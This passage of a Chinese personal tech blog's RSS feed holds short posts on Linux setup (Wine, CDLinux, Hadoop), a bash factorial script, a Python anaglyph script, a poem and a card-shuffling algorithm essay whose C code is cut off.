      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372012773173181/</guid>
    </item>
    <item>
      <title>
<![CDATA[自己动手写web服务器 ihttp 1.0[Fw]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200932921237207/</link>
      <description>
<![CDATA[一个简单的Web服务器, &lt;&lt;C and Linux Programming - advanced&gt;&gt;上的示例代码, 使用动态链接库机制, 动态加载模块, 有一个html模块支持html代码, <br><br><a target="_blank" rel="nofollow" href="http://dl.getdropbox.com/u/194885/ihttp1.0.tar.gz"  >源代码下载</a>:<br><br>使用说明:<br>tar xf ihttp1.0.tar.gz<br>cd ihttp<br>make<br>./ihttp<br>然后直接从浏览器访问即可: http://127.0.0.1:1234/<br>./ihttp -h查看说明<br><br>截个图:<br><a target="_blank" href="http://img.bimg.126.net/photo/kRQALUBL-YBxmWHLN0GhTg==/5647232457746364225.jpg"  ><img title="自己动手写web服务器 ihttp 1.0[Fw] - hankjin - 乱-Blog"  alt="自己动手写web服务器 ihttp 1.0[Fw] - hankjin - 乱-Blog"  style="width: 595px; height: 352px;"  src="http://img.bimg.126.net/photo/kRQALUBL-YBxmWHLN0GhTg==/5647232457746364225.jpg"  ></a><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200932921237207/</guid>
    </item>
    <item>
      <title>
<![CDATA[CDLinux 0.4.9开发环境]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200893110523704/</link>
      <description>
<![CDATA[CDLinuxd的开发环境是gcc-2.95.3+glibc-2.3.5，采用Slackware8.1作为开发环境，因为库一样的...，怀疑CDLinux0.4.9就是在Slackware8.1下开发的<br><br>开发环境：<br>虚拟机1： Slackware 8.1<br>虚拟机2： CDLinux 0.4.9，IDE硬盘，把CDLinux包拷贝过去<br>启动时从光盘启动，启动参数: cdlinux CDL_DEV=/dev/hda1<br><br>除了使用Slackware进行开发以外，RedHat 6.2的rpm包和一些deb包也可以用<br>常用命令：<br><div >

    










<ol><li>解压缩rpm包：<ol><li> rpm2cpio xxx.rpm | cpio -idmv
</li><li>使用deb包，CDlinux竟然自身提供了一个undeb工具，尝试lua40过程成功，结果失败(因为lua40用的是glibc2.3的库)。使用方法: <br></li></ol></li><li>解压缩deb包：<ol><li> rpm2cpio xxx.rpm | cpio -idmv
</li><li>undeb -x xxx.deb; tar xf data.tar.gz&nbsp; <br>
</li></ol></li><li>打包
<ol><li>tar zcvf python-2.1-cdl.tgz usr
</li></ol></li></ol>






        
  </div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200893110523704/</guid>
    </item>
    <item>
      <title>
<![CDATA[3110c蓝牙连接电脑上网]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201110572915377/</link>
      <description>
<![CDATA[1. Nokia套件方式:<br><wbr>安装Nokia套件,大度搜索"Nokia套件",然后选择相应的机型下载.<br>安装蓝牙驱动<br>打开Nokia套件, 使用蓝牙连接手机, 然后在Nokia套件上选择Internet连接<br>然后浏览器设置代理为10.0.0.172:80 <br>OK<br><br>2. 不使用套件的方式:<br>蓝牙连接-&gt;拨号网络-&gt; *99#]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201110572915377/</guid>
    </item>
    <item>
      <title>
<![CDATA[踟蹰]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009101661313596/</link>
      <description>
<![CDATA[咸阳殿上性命捐<br>冲冠一怒为红颜<br>名不正兮言不顺<br>拔剑踟蹰不能前<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009101661313596/</guid>
    </item>
    <item>
      <title>
<![CDATA[ubuntu下安装Wine并解决中文乱码]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200841034521275/</link>
      <description>
<![CDATA[sudo apt-get install wine<br>安装中文字体，从Windows的C:\windows\fonts目录下找到simsun.ttc和simfang.ttc<br>cp simsun.ttc ~/.wine/drive_c/fonts<br>cp simfang.ttc ~/.wine/drive_c/fonts<br><br><b>配置中文</b><br>vi ~/.wine/system.reg<br>找到<br>"MS Shell Dlg"="Tahoma"<br> "MS Shell Dlg 2"="Tahoma"<br> 修改为<br>"MS Shell Dlg"="SimSun"<br>"MS Shell Dlg 2"="SimSun"<br><br><b>配置命令行</b><br>在英文Ubuntu环境下，需要设置环境为zh_CN.UTF-8<br>alias wine="env LANG=zh_CN.UTF-8 wine"<br><br><b>安装dll</b><br>wget <a rel="nofollow" href="http://www.kegel.com/wine/winetricks"  >http://www.kegel.com/wine/winetricks</a><br>chmod +x winetricks<br>./winetricks msxml3 gdiplus riched20 riched30 vcrun6 vcrun2005sp1<br><br>然后执行<br>wine xxx.exe<br>即可]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200841034521275/</guid>
    </item>
    <item>
      <title>
<![CDATA[思维脑图+计划+日志]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372012218113134698/</link>
      <description>
<![CDATA[A一直想做个计划提醒类软件。1. 支持各种循环，2. 提醒方式支持短信和邮件，3.支持程序,Web和手机，4. 方便地同步<div>1. 支持循环，包括农历生日每年提醒，阳历生日每年提醒，锻炼身体每周提醒，起床每天提醒之类的。</div><div>2. 主要是短信提醒，自动发短信到手机</div><div>3. 可以以应用程序，Web界面，手机三种方式访问，应用程序主要是制定计划，临时上网时通过Web界面进行查看和简单操作，平常用手机查看</div><div>4. 应用程序</div><div>这几个功能都有现成的软件，可是很难互相同步，而且也不复杂，因此可以自己搞，虽然有点重复发明轮子的味道。</div><div>B还想做一个日志软件，写日记的，和计划软件集成，可以查看这些计划的执行情况。</div><div>C一大堆事情列在一起，没有条理，使用思维脑图来组织会更清楚，因此集成思维脑图功能，这个就是一个比较酷的东西了。</div><div><br></div><div>FreeMind是个Java的开源思维脑图，功能很强大，基于这个，增强计划的循环功能，增加日志功能和同步功能，基本雏形就出来了。</div><div>I have a dream.</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Favorite</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372012218113134698/</guid>
    </item>
    <item>
      <title>
<![CDATA[自己动手做红蓝3D图片]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201051782419374/</link>
      <description>
<![CDATA[<div>红蓝3D图片很简单<br>前先取两张图片，一张是左眼看到的，一张是右眼看到的<br>然后对任一点，取左眼看到的图片的R值，右眼看到的图片的G与B值，这样合成的图片就是3D图片。<br>最后戴上红蓝眼镜就能看到效果了。<br><br>import Image<br>imL=Image.open('left.jpg')<br>imR=Image.open('right.jpg')<br>w,h=imL.size<br>im=Image.new('RGB',(w*2,h))<br>for i in range(w):<br>&nbsp;&nbsp;&nbsp; for j in range(h):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cL=imL.getpixel((i,j))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cR=imR.getpixel((i,j))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; im.putpixel((i,j), cL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; im.putpixel((i+w,j), cR)<br>im.save('final.jpg')<br>im.show()<br>最后是left.jpg和right.jpg,以及合成的final.jpg<br>left.jpg:<br><img title="自己动手做红蓝3D图片 - hankjin - 云水居" alt="自己动手做红蓝3D图片 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/V0Y7Uo01CQYkQ658J67uHg==/3342515348439397137.jpg"></div>&nbsp;right.jpg:<div><img title="自己动手做红蓝3D图片 - hankjin - 云水居" alt="自己动手做红蓝3D图片 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/sR_Qc5KGG4xi5ZI1gwmC_A==/1517150124470606807.jpg"><br>final.jpg<br><div><div><img title="自己动手做红蓝3D图片 - hankjin - 云水居" alt="自己动手做红蓝3D图片 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/t6_f1FQpmQtRl4VV7xU-sA==/2371145203810735372.jpg"></div>&nbsp;</div>&nbsp;<br></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201051782419374/</guid>
    </item>
    <item>
      <title>
<![CDATA[bash的寂寞3-bash计算阶乘]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009829112216122/</link>
      <description>
<![CDATA[效率很低，计算100！竟然要将近5秒<br>$ time ./test.sh 100<br>100!=93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000<br><br>real&nbsp;&nbsp;&nbsp; 0m4.665s<br>user&nbsp;&nbsp;&nbsp; 0m4.550s<br>sys&nbsp;&nbsp;&nbsp;&nbsp; 0m0.120s<br>源码：<br>#!/bin/bash<br>function nx # calculate n!<br>{<br>&nbsp;&nbsp;&nbsp; if [ $1 -eq 1 ]; then #return condition<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for x in $@<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total[$i]=$x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i=$(($i+1))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for((i=$(($#-1));i&gt;0;i--))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n ${total[$i]}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit 0<br>&nbsp;&nbsp;&nbsp; fi<br>&nbsp;&nbsp;&nbsp; for x in $@<br>&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total[$i]=$x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i=$(($i+1))<br>&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp; for((i=$(($#-1));i&gt;0;i--))<br>&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result[$i]=$((${total[$i]}*$1))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if [ ${result[$i]} -gt 9 ]; then<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp=${result[$i]}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for((j=0;j&lt;10000;j++))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result[(($i+$j))]=$(($temp%10))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result[(($i+$j+1))]=$((${result[(($i+$j+1))]}+$temp/10))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp=${result[(($i+$j+1))]}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if [ $temp -lt 10 ]; then<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fi<br>&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp; nx $(($1-1)) ${result[*]}<br>}<br>if [ "$1" = "" ]; then<br>&nbsp;&nbsp;&nbsp; echo -e "Usage: $0 &lt;n&gt;\neg: $0 30 "<br>else<br>&nbsp;&nbsp;&nbsp; echo -n "$1!="<br>&nbsp;&nbsp;&nbsp; nx $1 1<br>fi<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009829112216122/</guid>
    </item>
    <item>
      <title>
<![CDATA[2012云南之行]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201282815356514/</link>
      <description>
<![CDATA[转眼1个多月了，云南之行未留片言，挖个坑，国庆回来写<br><br><wbr>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201282815356514/</guid>
    </item>
    <item>
      <title>
<![CDATA[神经网络之Feedforward Backpropagation前馈反向传播]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720106155950898/</link>
      <description>
<![CDATA[mark]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720106155950898/</guid>
    </item>
    <item>
      <title>
<![CDATA[gcj的移植]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009388252042/</link>
      <description>
<![CDATA[java虽然号称一次编译到处运行, 但是实际情况中的移植问题很多, 虽然有exe4j等工具将java封装成可执行文件,但是换汤不换药, 基本原理还是要跑虚拟机的.<br>然而在linux上, 因为有gcj, java程序的移植还是比较方便的<br>gcj Test.java --main=Test<br>然后把生成的a.out拷贝到目标机上, 运行时提示缺少libgcj.so.90, 从开发机上的/usr/lib下找到 libgcj.so.90.0.0拷贝到目标机上即可<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009388252042/</guid>
    </item>
    <item>
      <title>
<![CDATA[Hadoop源码之路一：安装Hadoop]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720131113620245/</link>
      <description>
<![CDATA[<br><wbr><div>1. 下载</div><div>sudo apt-get install openjdk-7-jdk</div><div>wget http://mirror.esocc.com/apache/hadoop/core/stable2/hadoop-2.2.0.tar.gz</div><div>tar xf hadoop-2.2.0.tar.gz</div><div>mv hadoop-2.2.0 hadoop</div><div>cd hadoop</div><div>2. 修改配置</div><div>2.1 vi etc/hadoop/hadoop-env.sh</div><div>export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-i386</div><div>export HADOOP_HEAPSIZE=300</div><div>2.2 vi etc/hadoop/yarn-env.sh</div><div><span style="line-height: 28px;"   >export JAVA_HOME=</span>/usr/lib/jvm/java-7-openjdk-i386</div><div><span style="line-height: 28px;"   >2.3 vi etc/hadoop/core-site.xml</span></div><div><div style="line-height: 28px;"   >&lt;configuration&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &lt;property&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;fs.default.name&lt;/name&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;hdfs://127.0.0.1:9000&lt;/value&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &lt;/property&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &lt;property&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;/home/hankjin/hadoop/tmp&lt;/value&gt;</div><div style="line-height: 28px;"   >&nbsp; &nbsp; &lt;/property&gt;</div><div style="line-height: 28px;"   >&lt;/configuration&gt;</div><div style="line-height: 28px;"   >2.4 vi etc/hadoop/hdfs-site.xml</div><div><div>&lt;configuration&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;dfs.default.name&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;/home/hankjin/hadoop/tmp&lt;/value&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;dfs.replication&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;1&lt;/value&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;dfs.permission&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;false&lt;/value&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&lt;/configuration&gt;</div></div></div><div>2.5 vi etc/hadoop/mapred-site.xml</div><div><div>&lt;configuration&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;mapreduce.framework.name&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;yarn&lt;/value&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&lt;/configuration&gt;</div></div><div>2.6 vi etc/hadoop/yarn-site.xml</div><div><div>&lt;configuration&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.resourcemanager.resource-tracker.address&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;127.0.0.1:8990&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.resourcemanager.scheduler.address&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;127.0.0.1:8991&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.resourcemanager.scheduler.class&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.resourcemanager.address&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;127.0.0.1:8993&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.nodemanager.local-dirs&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;/home/hankjin/hadoop/tmp/node&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.nodemanager.address&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;127.0.0.1:8994&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.nodemanager.resource.memory-mb&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;3072&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.nodemanager.remote-app-log-dir&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;/home/hankjin/hadoop/tmp/app-logs&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.nodemanager.log-dirs&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;/home/hankjin/hadoop/tmp/node&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&nbsp; &nbsp; &lt;property&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;value&gt;mapreduce_shuffle&lt;/value&gt;</div><div>&nbsp; &nbsp; &nbsp; &nbsp; &lt;description&gt;&lt;/description&gt;</div><div>&nbsp; &nbsp; &lt;/property&gt;</div><div>&lt;/configuration&gt;</div></div><div>2.7 vi etc/hadoop/slaves</div><div>127.0.0.1</div><div><br></div><div>3. 启动并测试</div><div>bin/hadoop namenode -format</div><div>./sbin/start-dfs.sh</div><div>./sbin/start-yarn.sh</div><div>wget http://www.gutenberg.org/cache/epub/20417/pg20417.txt</div><div>bin/hadoop dfs -mkdir /tmp</div><div>bin/hadoop dfs -copyFromLocal pg20417.txt /tmp/</div><div>bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-2.2.0.jar wordcount /tmp/pg20417.txt /tmp-output</div><div>http://127.0.0.1:8088/</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720131113620245/</guid>
    </item>
    <item>
      <title>
<![CDATA[洗牌算法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720109141128016/</link>
      <description>
<![CDATA[54张有序的扑克牌，设计一种算法，实现洗牌操作：<br>方法一：<br>1。随机产生一个1-n的数x，做为第一张牌。<br>2。随机产生一个1-(n-1)的数y，如果y&lt;x，则将y作为第二张牌，否则将y+1作为第二张牌。<br>3。随机产生一个1-(n-i)的数z，取第z个没有被抽出来的作为第i张牌。(i=3,4,5...54)<br>这种算法的复杂度为O(N^2)，因为计算每个随机数的牌号平均要执行(N/2)次比较。<br>对应于现实中的扑克牌，这种算法等于每次从牌堆中随机抽一张，放到另一堆上，直到抽完为止，这里新的一堆就是洗完的牌序。<br><br>方法二：<br>1。随机产生一个1-n的数x，然后让第x张牌和第1张牌互相调换。<br>2。随机产生一个1-n的数y，然后让第y张牌和第2张牌互相调换。<br>3。随机产生一个1-n的数z，然后让第z张牌和第i张牌互相调换。(i=3,4,5...54)<br>这种算法的复杂度为O(N)。<br><br>方法三：<br>因为一共有N!种洗牌结果，所以可以等概率地产生一个1-N!之间的随机数x，然后用康托展开的方法，根据x生成对应的排列，即为洗牌结果。<br>关于康托展开，参考http://baike.baidu.com/view/437641.htm<br><br>方法一的改进：<br>方法一由于计算随机数对应的牌号平均要执行(N/2)次比较，所以复杂度为O(N^2)，N*N的第一个N是牌的数目，无法优化，但是第二个N是确定牌的序号，这个是否有办法优化呢？<br>第一种优化就是每次抽出一张牌后，就将之后的所有牌向前移动一个单位，下次产生的随机数就是目标牌的下标。<br>如第一次随机数为3，抽出3，扑克牌数组变为1 2 4 5 6 7...<br>第二次抽出6，直接取数组的第六个元素即7，然后把7之后的牌前移一个单位。这样牌的定位复杂度就是1了，但是移动的复杂度仍为N/2，所以这种算法并没有起到效率优化的目标。<br>第二种优化是为树状数组。用一个长为54的树状数组 used 存储 1-i 张牌中被投抽出来的牌的张数。这样 i-used[i] 就是牌号为 i 的扑克的序号。然后用2分查找的方式，就可以快速确定随机数对应的牌号，树状树的复杂度为logn，这样总的算法复杂度为O(NlogN)。<br>但是考虑到一种54张牌，树状数组优化带来的性能提升很小，比起程序代码带来的可维护性损失，颇不值得。<br><br>方法二的修正：<br>方法二乍看好像不错，网上也有很多文章使用这种算法，但是其实这是一种错误的方法，因为方法二的所有可能性为N^N，而洗好的牌一种有N!种可能，又因为N^N % N! !=0，所以每种结果的概率是不相同的。<br>那么如何修正这个问题呢？仿照第一种方法，第i次洗牌不是产生一个1-n的随机数，而是产生一个i-n的随机数，这样可能性结果的可能性就是N!了。就有可能概率相等了。<br>证明在&lt;&lt;计算机程序设计艺术&gt;&gt;上。<br><br>方法一代码：<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#define N 54<br><br>int poker[N+1];<br>void shuffle(){<br>&nbsp;&nbsp;&nbsp; int used[N+1];<br>&nbsp;&nbsp;&nbsp; int i,j,k;<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;=N;i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; used[i]=0;<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;=N;i++){//定位<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k = rand()%(N+1-i)+1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(j=1;k!=0;j++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(0==used[j])//只计算未抽出的牌<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k--;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; poker[i]=j-1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; used[j-1]=1;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; int i;<br>&nbsp;&nbsp;&nbsp; srand(time(NULL));<br>&nbsp;&nbsp;&nbsp; shuffle();<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;=N;i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%d ", poker[i]);<br>&nbsp;&nbsp;&nbsp; printf("\n");<br>}<br>修正后的方法二代码：<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#define swap(a,b) {int t=(a);(a)=(b);(b)=(t);}<br>#define N 54<br><br>int poker[N+1];<br>void shuffle(){<br>&nbsp;&nbsp;&nbsp; int i,k;<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;=N;i++)//初始化<br>
